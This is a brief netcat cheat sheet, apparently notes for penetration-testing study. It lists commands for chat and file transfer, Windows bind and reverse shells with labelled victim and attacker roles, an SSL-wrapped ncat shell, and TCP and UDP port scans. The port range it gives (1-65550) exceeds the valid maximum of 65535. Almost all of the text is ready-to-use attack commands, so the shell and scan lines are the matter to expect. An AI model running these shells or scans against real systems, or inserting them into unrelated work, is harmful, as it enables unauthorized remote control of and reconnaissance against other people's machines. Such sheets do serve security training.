nc -nv <ip> <port>

CHAT

    nc -nlvp 4444
    nc -nv <ip> 4444

FILE TRANSFER

    nc -nlvp 4444 > file.exe  
    nc -nv <ip> 4444 < file.exe

BIND SHELL

    VICTIM (server)
        nc -lvp 4444 -e cmd.exe

    ATTACKER (client)
        nc -nv <IP Address> 4444

REVERSE SHELL

    ATTACKER (server)
        nc -lvp 4444

    VICTIM (client)
        nc -nv <IP Address> 4444 -e cmd.exe

NCAT for increased security

    VICTIM (server)
        ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl

    ATTACKER (client)
        ncat -nv <IP Address> 4444 --ssl

Port Scanning with NC

    TCP Connect Port Scan

        nc -nvv -w 1 -z <ip> 1-65550

    UDP Scan

        nc -unvv -w 1 -z <ip> 1-65550
